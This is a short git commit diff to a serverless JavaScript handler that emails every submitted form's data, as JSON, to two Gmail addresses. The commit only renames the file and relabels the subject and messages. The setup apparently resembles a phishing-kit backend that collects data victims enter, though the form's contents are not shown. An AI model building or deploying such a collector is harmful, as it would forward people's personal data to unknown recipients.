63668c4f5756f016955ade60c0d84de2d171a880
apisubmit-8ll0irlrwerwe <idf193819@gmail.com>
2025-08-30 07:51:44 +0500

    Update and rename asif.js to bilal.js

--- bilal.js
+++ bilal.js
@@ -38,9 +38,9 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "newzatpage.@gmail.com,submitdispute@gmail.com",
-      subject: "Asif Testing",
+      subject: "Bilal",
       text: JSON.stringify(formData, null, 2),
-      html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
+      html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
         null,
         2
@@ -49,7 +49,7 @@ export default async function handler(req, res) {
 
     res
       .status(200)
-      .json({ success: true, message: "Data sent via email (Asif)" });
+      .json({ success: true, message: "Data sent via email (Professor)" });
   } catch (error) {
     console.error("Email send error:", error);
     res.status(500).json({ error: "Failed to send email" });
